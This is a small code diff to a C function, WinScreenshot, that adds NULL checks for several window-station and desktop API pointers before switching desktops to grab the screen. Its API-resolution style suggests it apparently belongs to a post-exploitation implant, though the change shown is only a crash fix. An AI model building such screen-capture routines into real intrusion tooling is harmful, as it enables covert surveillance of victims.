@@ -1139,9 +1139,14 @@ BOOL WinScreenshot(
      * Guard every function pointer before calling — if user32 loaded without
      * exporting one of these symbols the pointer is NULL and calling it crashes.
      */
-    if ( Instance->Win32.OpenWindowStation    &&
+    if ( Instance->Win32.OpenWindowStation      &&
          Instance->Win32.GetProcessWindowStation &&
-         Instance->Win32.SetProcessWindowStation ) {
+         Instance->Win32.SetProcessWindowStation &&
+         Instance->Win32.CloseWindowStation      &&
+         Instance->Win32.GetThreadDesktop        &&
+         Instance->Win32.OpenDesktopA            &&
+         Instance->Win32.SetThreadDesktop        &&
+         Instance->Win32.CloseDesktop ) {
 
     dwThreadId = (DWORD)(ULONG_PTR)Instance->Teb->ClientId.UniqueThread;
     hOldWinSta = Instance->Win32.GetProcessWindowStation();
@@ -1173,7 +1178,7 @@ BOOL WinScreenshot(
         }
     }
 
-    } /* end: OpenWindowStation && GetProcessWindowStation && SetProcessWindowStation guard */
+    } /* end: WinSta0/desktop fn-ptr guard */
 
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
